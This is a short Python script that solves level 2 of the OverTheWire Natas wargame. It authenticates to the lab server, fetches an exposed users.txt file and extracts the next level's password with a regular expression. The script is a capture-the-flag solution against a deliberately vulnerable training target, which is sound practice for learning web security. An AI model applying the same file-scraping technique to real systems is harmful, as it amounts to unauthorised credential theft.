#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level2pass):
    print "{+} Natas Level 2. Doing magic..."
    try:
        r = requests.get(url="http://natas2.natas.labs.overthewire.org/files/users.txt", auth=HTTPBasicAuth('natas2', level2pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("natas3:(.*?)\n", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level2password" %(args[0]))
    level3pass = exploit(args[1])
    if level3pass != None:
        print "{$$} Level 3 Password is: %s" %(level3pass)

if __name__ == "__main__":
    main(args=sys.argv)
